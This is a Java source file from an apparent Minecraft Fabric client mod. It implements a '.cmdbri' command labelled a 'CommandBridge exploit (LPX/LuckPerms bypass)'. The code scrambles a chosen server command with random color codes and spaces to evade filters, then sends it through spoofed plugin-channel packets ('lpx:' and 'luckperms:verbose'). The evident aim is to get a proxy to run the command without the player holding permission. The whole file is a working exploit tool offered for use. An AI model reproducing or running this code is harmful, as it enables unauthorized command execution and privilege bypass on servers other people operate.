package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;
import net.minecraft.command.CommandSource;
import io.github.spigotrce.paradiseclientfabric.packet.CommandBridgePayloadPacket;

import java.nio.charset.StandardCharsets;
import java.util.Random;

public class CommandBridge extends Command {

    public CommandBridge(MinecraftClient minecraftClient) {
        super("cmdbri", "CommandBridge exploit (LPX/LuckPerms bypass)", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return LiteralArgumentBuilder.<CommandSource>literal(getName())
            .then(RequiredArgumentBuilder.<CommandSource, String>argument("serverID", StringArgumentType.string())
                .then(RequiredArgumentBuilder.<CommandSource, String>argument("command", StringArgumentType.greedyString())
                    .executes(this::sendPayload)))
            .executes(this::incomplete);
    }

    private int sendPayload(CommandContext<CommandSource> context) {
        String serverID = context.getArgument("serverID", String.class);
        String command = context.getArgument("command", String.class);

        if (serverID == null || command == null || serverID.isEmpty() || command.isEmpty()) {
            Helper.printChatMessage("§cInvalid server ID or command.");
            return 0;
        }

        // Obfuscate command to bypass filters
        String obfuscatedCommand = obfuscateCommand(command);

        // Build payload using fake LPX trick
        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(
            new CommandBridgePayloadPacket(obfuscatedCommand, "lpx:" + serverID)
        );

        // Send on async thread to avoid client-side lag/kick
        new Thread(() -> {
            try {
                Helper.sendPacket(packet);

                // Optional: Legacy LPX-like channel spoof
                PacketByteBuf lpxBuf = new PacketByteBuf(io.netty.buffer.Unpooled.buffer());
                lpxBuf.writeString("luckperms:verbose", StandardCharsets.UTF_8);
                lpxBuf.writeByteArray(obfuscatedCommand.getBytes(StandardCharsets.UTF_8));
                Helper.sendPacket(new CustomPayloadC2SPacket(new Identifier("lpx", "proxy"), lpxBuf));

                Helper.printChatMessage("§a[CommandBridge] §fPayload sent to §e" + serverID + "§f with spoofed command.");
            } catch (Exception e) {
                Helper.printChatMessage("§c[CommandBridge] Failed to send payload: " + e.getMessage());
            }
        }).start();

        return 1;
    }

    private int incomplete(CommandContext<CommandSource> context) {
        Helper.printChatMessage("§eUsage: .cmdbri <serverID> <command>");
        return 1;
    }

    /**
     * Obfuscate a command with random spaces, color codes, etc. to bypass LPX filters.
     */
    private String obfuscateCommand(String command) {
        Random random = new Random();
        StringBuilder builder = new StringBuilder();

        for (char c : command.toCharArray()) {
            builder.append(c);
            if (random.nextBoolean()) {
                builder.append("§").append(randomColorChar());
            }
            if (random.nextInt(5) == 0) {
                builder.append(" ");
            }
        }

        return builder.toString();
    }

    /**
     * Returns a random color code character for obfuscation (0-9, a-f).
     */
    private char randomColorChar() {
        String colorCodes = "0123456789abcdef";
        return colorCodes.charAt(new Random().nextInt(colorCodes.length()));
    }
 }
